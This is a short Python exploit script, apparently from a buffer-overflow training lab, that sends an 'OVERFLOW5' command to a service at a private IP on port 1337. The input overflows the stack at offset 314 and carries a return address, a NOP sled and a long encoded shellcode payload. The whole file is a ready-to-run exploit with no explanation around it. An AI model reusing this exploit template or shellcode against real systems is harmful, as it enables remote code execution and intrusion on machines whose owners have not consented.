#!/usr/bin/python3

import socket

ip = "10.10.240.201"
port = 1337

prefix = "OVERFLOW5 "
offset = 314
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\xb2\x9c\xac\x4c\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x4e\x74\x2e\x4c\xae"
"\x85\x4f\xc4\x4b\xb4\x4f\xb2\x18\xe7\x7f\xb0\x4c\x04\x0b\x94"
"\x64\x9f\x79\x31\x8b\x28\x37\x67\xa2\xa9\x64\x5b\xa5\x29\x77"
"\x88\x05\x13\xb8\xdd\x44\x54\xa5\x2c\x14\x0d\xa1\x83\x88\x3a"
"\xff\x1f\x23\x70\x11\x18\xd0\xc1\x10\x09\x47\x59\x4b\x89\x66"
"\x8e\xe7\x80\x70\xd3\xc2\x5b\x0b\x27\xb8\x5d\xdd\x79\x41\xf1"
"\x20\xb6\xb0\x0b\x65\x71\x2b\x7e\x9f\x81\xd6\x79\x64\xfb\x0c"
"\x0f\x7e\x5b\xc6\xb7\x5a\x5d\x0b\x21\x29\x51\xe0\x25\x75\x76"
"\xf7\xea\x0e\x82\x7c\x0d\xc0\x02\xc6\x2a\xc4\x4f\x9c\x53\x5d"
"\x2a\x73\x6b\xbd\x95\x2c\xc9\xb6\x38\x38\x60\x95\x54\x8d\x49"
"\x25\xa5\x99\xda\x56\x97\x06\x71\xf0\x9b\xcf\x5f\x07\xdb\xe5"
"\x18\x97\x22\x06\x59\xbe\xe0\x52\x09\xa8\xc1\xda\xc2\x28\xed"
"\x0e\x44\x78\x41\xe1\x25\x28\x21\x51\xce\x22\xae\x8e\xee\x4d"
"\x64\xa7\x85\xb4\xef\xc2\x5f\xab\x7a\xba\x5d\xd3\x95\x67\xeb"
"\x35\xff\x87\xbd\xee\x68\x31\xe4\x64\x08\xbe\x32\x01\x0a\x34"
"\xb1\xf6\xc5\xbd\xbc\xe4\xb2\x4d\x8b\x56\x14\x51\x21\xfe\xfa"
"\xc0\xae\xfe\x75\xf9\x78\xa9\xd2\xcf\x70\x3f\xcf\x76\x2b\x5d"
"\x12\xee\x14\xe5\xc9\xd3\x9b\xe4\x9c\x68\xb8\xf6\x58\x70\x84"
"\xa2\x34\x27\x52\x1c\xf3\x91\x14\xf6\xad\x4e\xff\x9e\x28\xbd"
"\xc0\xd8\x34\xe8\xb6\x04\x84\x45\x8f\x3b\x29\x02\x07\x44\x57"
"\xb2\xe8\x9f\xd3\xd2\x0a\x35\x2e\x7b\x93\xdc\x93\xe6\x24\x0b"
"\xd7\x1e\xa7\xb9\xa8\xe4\xb7\xc8\xad\xa1\x7f\x21\xdc\xba\x15"
"\x45\x73\xba\x3f\x45\x73\x44\xc0")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
